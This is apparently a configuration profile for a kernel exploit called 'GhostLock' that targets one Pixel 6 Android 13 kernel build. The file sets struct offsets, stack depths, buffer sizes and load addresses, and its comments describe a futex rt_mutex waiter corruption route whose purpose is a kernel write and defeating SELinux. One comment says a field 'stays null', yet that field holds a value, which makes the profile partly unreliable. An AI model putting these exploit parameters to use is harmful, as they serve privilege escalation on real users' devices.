# GhostLock kernel profile: 5.10.157-android13-4-00001-g5c7ff5dc7aac-ab10381520 (HOCON, self-contained).
# Pixel 6 (oriole), Tensor G1. Derived 2026-10-17 from the factory image
# (TQ3A.230805.001) by tools/extract_rs on-device: kallsyms 144109 symbols,
# waiter layout identical to marble (tree_entry=0x0 pi_tree_entry=0x18 task=0x30
# lock=0x38 size=0x50), cred.copy_size=168.
# Route: select_stack is GEOMETRICALLY INFEASIBLE on this kernel (do_futex frame
# 0x130 vs marble 0x70 pushes the futex waiter 0xc0 qwords BELOW the pselect
# fd_set: delta=-192), so the upstream-native multicast_waiter route is used
# (extractor-validated: setsockopt depth 0x358 - futex depth 0x2d0 => waiter_off
# 0x88; 136+56+8=200 <= 264 buffer).
# kernel_phys_load stays null: ro.soc.manufacturer=Google => the runtime derives
# Tensor DRAM base 0x80000000 (KIMAGE_TEXT_BASE - MTK_VADDR_BASE).
release = "5.10.157-android13-4-00001-g5c7ff5dc7aac-ab10381520"
schema_version = 1
kernel_major = 5
recommend_shizuku = 0
kernel_phys_load = 2147483648
kernel_phys_offset = null
route {
  multicast_waiter {
    waiter_off = 136
    buffer_size = 264
    task_offset = 48
    lock_offset = 56
    # 2 = the 5.10 compact rt_mutex_waiter (prio at 0x40, no wake_state, no
    # ww_ctx). This kernel is 5.10.157, so 2 matches the layout the extractor
    # reported above; 1 (the 6.1 shape) puts the ghost waiter's prio into the
    # padding half of 0x40, the payload's `prio > 120` erase gate never opens
    # and the write silently does not happen -- the on-device symptom is
    # `Write 1 failed` with SELinux still enforcing.
    compact_waiter = 2
  }
}
